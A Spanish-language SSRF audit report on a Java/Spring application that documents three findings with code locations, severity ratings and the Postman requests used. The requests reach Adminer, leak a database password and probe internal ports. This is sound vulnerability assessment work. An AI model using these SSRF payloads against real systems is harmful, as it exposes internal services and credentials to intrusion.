# Reporte SSRF

Requests de la colección de Postman `SSRF`, contra `http://localhost:5173`.

## 01 · `/consultar-url` consulta servicios internos

| | |
|---|---|
| Archivo:línea | `integracion/IntegracionServicio.java:26-47` (petición en `:33`), `integracion/IntegracionControlador.java:23-26` |
| Impacto | El servidor entra a servicios internos (Adminer) y a sus propios endpoints; entrega la contraseña de la base de datos |
| STRIDE / OWASP | Information Disclosure · A10 Server-Side Request Forgery |
| Severidad | **Alta**: sin sesión y con una sola petición |

```json
{ "method": "POST", "url": "http://localhost:5173/api/integraciones/consultar-url?url=http://adminer:8080/" }
{ "method": "POST", "url": "http://localhost:5173/api/integraciones/consultar-url?url=http://localhost:8080/api/diagnostico" }
```

Respuesta: `200` · `{"estado":"OK","contenido":"...<title>Login - Adminer</title>..."}` · `{"estado":"OK","contenido":"...\"SPRING_DATASOURCE_PASSWORD\":\"root123\"..."}`

**Corregido** en el PR `fix/ssrf`: ahora responde `{"estado":"RECHAZADO","error":"Destino no permitido"}`.

## 02 · `/enviar` hace POST a servicios internos

| | |
|---|---|
| Archivo:línea | `integracion/IntegracionServicio.java:54-70` (petición en `:60`), `integracion/IntegracionControlador.java:28-31` |
| Impacto | Igual que 01, pero además envía datos a servicios internos |
| STRIDE / OWASP | Information Disclosure · A10 Server-Side Request Forgery |
| Severidad | **Alta**: sin sesión y con una sola petición |

```json
{ "method": "POST", "url": "http://localhost:5173/api/integraciones/enviar?url=http://adminer:8080/", "body": "{}" }
```

Respuesta: `200` · `{"estado":"OK","contenido":"...<title>Login - Adminer</title>..."}`

## 03 · `/verificar-host` escanea puertos internos

| | |
|---|---|
| Archivo:línea | `integracion/IntegracionServicio.java:77-93` (URL armada en `:79`), `integracion/IntegracionControlador.java:34-37` |
| Impacto | Mapa de qué servicios y puertos existen en la red interna; prepara otros ataques |
| STRIDE / OWASP | Information Disclosure · A10 Server-Side Request Forgery |
| Severidad | **Media**: no entrega datos, solo si un puerto está abierto |

```json
{ "method": "GET", "url": "http://localhost:5173/api/integraciones/verificar-host?host=mysql&puerto=3306" }
{ "method": "GET", "url": "http://localhost:5173/api/integraciones/verificar-host?host=mysql&puerto=3399" }
```

Respuesta: `3306` → `{"abierto":false,"error":"Status code '-1' should be a three-digit positive integer"}` (abierto: respondió algo que no es HTTP) · `3399` → `{"abierto":false,"error":"I/O error ... Connection refused"}` (cerrado)
